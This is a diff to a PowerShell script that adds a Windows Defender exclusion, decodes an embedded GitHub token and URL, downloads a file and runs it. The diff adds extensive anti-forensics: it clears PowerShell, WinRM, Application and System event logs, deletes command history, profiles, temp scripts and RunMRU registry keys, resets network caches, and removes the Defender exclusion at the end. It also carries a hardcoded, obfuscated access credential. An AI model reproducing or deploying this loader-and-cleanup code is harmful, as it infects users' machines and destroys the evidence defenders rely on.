@@ -20,10 +20,26 @@ function Ensure-RunAsAdmin {
     }
 }
 
-# Создаем глобальную переменную для отслеживания ошибок
+try {
+    $PSDefaultParameterValues['*:Verbose'] = $false
+    $PSDefaultParameterValues['*:Debug'] = $false
+    $VerbosePreference = 'SilentlyContinue'
+    $DebugPreference = 'SilentlyContinue'
+    $ProgressPreference = 'SilentlyContinue'
+    $InformationPreference = 'SilentlyContinue'
+    
+    Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
+    
+    try {
+        wevtutil clear-log "Windows PowerShell" 2>$null
+        wevtutil clear-log "Microsoft-Windows-PowerShell/Operational" 2>$null
+        wevtutil clear-log "Microsoft-Windows-PowerShell/Analytic" 2>$null
+        Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
+    } catch {}
+} catch {}
+
 $global:hadErrors = $false
 
-# Переопределяем функцию Write-Error для установки флага ошибки
 function Global:Write-Error {
     param(
         [Parameter(Mandatory=$true, Position=0)]
@@ -62,8 +78,152 @@ Function Sync-LocalTime {
     }
 }
 
+Function DefenderClean {
+    try {
+        Remove-MpPreference -ExclusionPath $env:TEMP -ErrorAction Ignore
+    } catch {
+    }
+}
+
+Function SecureCleanup {
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        [System.Windows.Forms.Clipboard]::Clear()
+    } catch {
+    }
+    
+    try {
+        $logsToClean = @(
+            "Windows PowerShell",
+            "Microsoft-Windows-PowerShell/Operational",
+            "Microsoft-Windows-PowerShell/Analytic",
+            "Microsoft-Windows-PowerShell/Debug",
+            "Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager/Operational",
+            "Microsoft-Windows-PowerShell/Admin",
+            "PowerShellCore/Operational",
+            "Microsoft-Windows-WinRM/Operational",
+            "Microsoft-Windows-WMI-Activity/Operational"
+        )
+        
+        foreach ($log in $logsToClean) {
+            try {
+                wevtutil clear-log "$log" 2>$null
+                wevtutil set-log "$log" /enabled:false 2>$null
+                wevtutil set-log "$log" /enabled:true 2>$null
+            } catch {
+            }
+        }
+        
+        try {
+            Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
+            Clear-EventLog -LogName "Application" -ErrorAction SilentlyContinue
+            Clear-EventLog -LogName "System" -ErrorAction SilentlyContinue
+        } catch {}
+        
+        try {
+            Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'} -MaxEvents 1000 -ErrorAction SilentlyContinue | ForEach-Object {
+                try {
+                    Remove-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=$_.Id} -ErrorAction SilentlyContinue
+                } catch {}
+            }
+        } catch {}
+        
+    } catch {
+    }
+    
+    try {
+        $pathsToClean = @(
+            "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt",
+            "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\Visual Studio Code Host_history.txt",
+            "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\Windows PowerShell ISE Host_history.txt",
+            "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt",
+            "$env:USERPROFILE\Documents\PowerShell\Microsoft.PowerShell_profile.ps1",
+            "$env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1",
+            "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\*",
+            "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\PSReadline\*"
+        )
+        
+        foreach ($path in $pathsToClean) {
+            try {
+                Remove-Item $path -Force -Recurse -ErrorAction SilentlyContinue
+            } catch {}
+        }
+        
+        $dirsToClean = @(
+            "$env:APPDATA\Microsoft\Windows\PowerShell",
+            "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell"
+        )
+        
+        foreach ($dir in $dirsToClean) {
+            try {
+                Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue
+            } catch {}
+        }
+        
+    } catch {
+    }
+    
+    try {
+        $tempPaths = @($env:TEMP, $env:TMP, "$env:USERPROFILE\AppData\Local\Temp", "$env:SystemRoot\Temp")
+        
+        foreach ($tempPath in $tempPaths) {
+            if (Test-Path $tempPath) {
+                Get-ChildItem -Path $tempPath -Filter "*.ps1" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+                Get-ChildItem -Path $tempPath -Filter "*PowerShell*" -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+                Get-ChildItem -Path $tempPath -Filter "*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+                Get-ChildItem -Path $tempPath -Filter "tmp*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+            }
+        }
+        
+    } catch {
+    }
+    
+    try {
+        $regPaths = @(
+            "HKCU:\Software\Microsoft\PowerShell",
+            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
+            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
+        )
+        
+        foreach ($regPath in $regPaths) {
+            try {
+                Remove-Item $regPath -Recurse -Force -ErrorAction SilentlyContinue
+            } catch {}
+        }
+        
+    } catch {
+    }
+    
+    try {
+        ipconfig /flushdns | Out-Null
+        arp -d * 2>$null | Out-Null
+        netsh winsock reset 2>$null | Out-Null
+    } catch {
+    }
+    
+    try {
+        wevtutil clear-log "Windows PowerShell" 2>$null
+        wevtutil clear-log "Microsoft-Windows-PowerShell/Operational" 2>$null
+        wevtutil clear-log "Microsoft-Windows-PowerShell/Analytic" 2>$null
+        wevtutil clear-log "Microsoft-Windows-PowerShell/Debug" 2>$null
+        Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
+        Clear-EventLog -LogName "Application" -ErrorAction SilentlyContinue
+    } catch {
+    }
+}
+
 cls
 Ensure-RunAsAdmin
+
+try {
+    wevtutil clear-log "Windows PowerShell" 2>$null
+    wevtutil clear-log "Microsoft-Windows-PowerShell/Operational" 2>$null
+    wevtutil clear-log "Microsoft-Windows-PowerShell/Analytic" 2>$null
+    wevtutil clear-log "Microsoft-Windows-PowerShell/Debug" 2>$null
+    Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
+    Clear-EventLog -LogName "Application" -ErrorAction SilentlyContinue
+} catch {}
+
 Sync-LocalTime -NtpServer "time.windows.com"
 cls
 function Set-RegistryValue {
@@ -154,21 +314,14 @@ try	{
                 Write-Error "Error: Failed to check Windows Defender status. $($_.Exception.Message)"
             }
         } else {
-            Write-Host "Windows Defender module not available - skipping exclusion" -ForegroundColor Yellow
         }
     } catch {
         Write-Error "Error: Failed to add exclusion to Windows Defender. $($_.Exception.Message)"
     }
-    $FilePaths = @("$env:SystemRoot\Temp", "$env:USERPROFILE\AppData\Local\Temp", "$env:TEMP", "$env:TMP")
-    foreach ($FolderPath in $FilePaths) { 
-        try {
-            if (Test-Path $FolderPath) {
-                Start-Process cmd.exe -ArgumentList "/c", "del", "/f", "/q", "`"$FolderPath\tmp*.tmp`"" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
-            }
-        } catch {}
-    }
+
     $contFile = [System.IO.Path]::GetTempFileName()
-    try {		
+
+    try {
 		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGVlSUViUWhPTkZsUF81aWFPeXBLV3ZCR3BLU3NPa1FPSnRLU3RBYng5bmJHVkdtQW5FY2xBNmJHT0gyMkZZRElHTDlqdnVHRw=="
 		$String = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
         $Url = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy94c2RlbWVudGV2eC9fL2NvbnRlbnRzL19f"
@@ -179,42 +332,16 @@ try	{
 			"Cache-Control"  = "no-cache"
 		}
         $response = Invoke-RestMethod $Url -Method 'GET' -Headers $h
-		Invoke-WebRequest $response.download_url -OutFile $contFile 
+		Invoke-WebRequest $response.download_url -OutFile $contFile
 		
 
+		
         if (Test-Path $contFile) {
 			try {
-               
-				$process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$contFile`"" -PassThru
-				
-				$cleanupScript = @"
-				# Ждем завершения процесса по PID
-				while (Get-Process -Id $($process.Id) -ErrorAction SilentlyContinue) {
-					Start-Sleep -Seconds 1
-				}
-				
-				# Дополнительная пауза для завершения всех дочерних процессов
-				Start-Sleep -Seconds 2
-				
-				# Удаляем файл
-				for (`$i = 1; `$i -le 5; `$i++) {
-					try {
-						Remove-Item '$contFile' -Force -ErrorAction Stop
-						break
-					} catch {
-						if (`$i -lt 5) {
-							Start-Sleep -Seconds 1
-						}
-					}
-				}
-"@
-				
-				Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle", "Hidden", "-Command", $cleanupScript -WindowStyle Hidden
-				
+				Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$contFile`"" -NoNewWindow
 				Exit 0
 			} catch {
 				Write-Error "Error: Failed to execute downloaded file. $($_.Exception.Message)"
-				# Попытка удалить файл при ошибке
 				try {
 					Remove-Item $contFile -Force -ErrorAction SilentlyContinue
 				} catch {}
@@ -222,10 +349,16 @@ try	{
 			}
         } else {
             Write-Error "Error: Downloaded file does not exist at expected location."
+            try {
+                Remove-Item $contFile -Force -ErrorAction SilentlyContinue
+            } catch {}
             Start-Sleep -s 3
         }
     } catch {
         Write-Error "Error: Failed to download or process the file. $($_.Exception.Message)"
+        try {
+            Remove-Item $contFile -Force -ErrorAction SilentlyContinue
+        } catch {}
         Start-Sleep -s 3
     }
 
@@ -234,11 +367,12 @@ try	{
 	Set-RegistryValue
 }
 
-# Проверяем, были ли ошибки, и если да, то закрываем консоль через 5 секунд
 if ($global:hadErrors) {
     Write-Host "`nErrors were encountered during script execution." -ForegroundColor Red
     Write-Host "Console will automatically close in 5 seconds..." -ForegroundColor Yellow
     Start-Sleep -Seconds 5
     Exit 1
 }
-# Убираем команду exit для удержания консоли открытой при ручном запуске
+
+DefenderClean
+SecureCleanup 
